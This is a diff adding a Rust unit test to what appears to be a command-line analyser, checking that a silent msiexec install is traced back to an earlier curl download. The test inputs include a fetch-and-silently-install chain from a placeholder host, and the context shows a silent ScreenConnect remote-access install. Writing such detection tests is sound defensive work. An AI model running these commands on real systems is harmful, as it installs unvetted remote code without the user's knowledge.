@@ -8414,6 +8414,29 @@ msiexec /i ScreenConnect.ClientSetup.msi /qn"#,
             report.traits
         );
     }
+
+    #[test]
+    fn msiexec_basename_package_resolves_full_path_download_source() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl -o C:\Temp\setup.msi https://msiexec-basename.example/setup.msi"#,
+            &mut env,
+        );
+        interpret_line("msiexec /i setup.msi /qn", &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "msiexec /i setup.msi /qn"
+                        && url == "https://msiexec-basename.example/setup.msi"
+            )
+        });
+        assert!(
+            has,
+            "msiexec basename package did not resolve full-path download source: {:?}",
+            env.traits
+        );
+    }
 }
 
 #[cfg(test)]
